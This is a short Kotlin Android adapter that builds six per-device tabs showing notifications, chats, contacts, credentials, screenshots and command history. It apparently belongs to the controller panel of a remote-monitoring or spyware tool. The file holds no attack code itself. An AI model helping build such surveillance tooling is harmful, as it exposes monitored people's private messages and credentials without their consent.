package com.chats.controller.ui.devices

import androidx.fragment.app.Fragment
import androidx.fragment.app.FragmentActivity
import androidx.viewpager2.adapter.FragmentStateAdapter

class DeviceDataPagerAdapter(
    fragmentActivity: FragmentActivity,
    private val deviceId: String
) : FragmentStateAdapter(fragmentActivity) {
    
    override fun getItemCount(): Int = 6
    
    override fun createFragment(position: Int): Fragment {
        return when (position) {
            0 -> NotificationsFragment.newInstance(deviceId)
            1 -> ChatsFragment.newInstance(deviceId)
            2 -> ContactsFragment.newInstance(deviceId)
            3 -> CredentialsFragment.newInstance(deviceId)
            4 -> ScreenshotsFragment.newInstance(deviceId)
            5 -> CommandHistoryFragment.newInstance(deviceId)
            else -> throw IllegalArgumentException("Invalid position: $position")
        }
    }
}
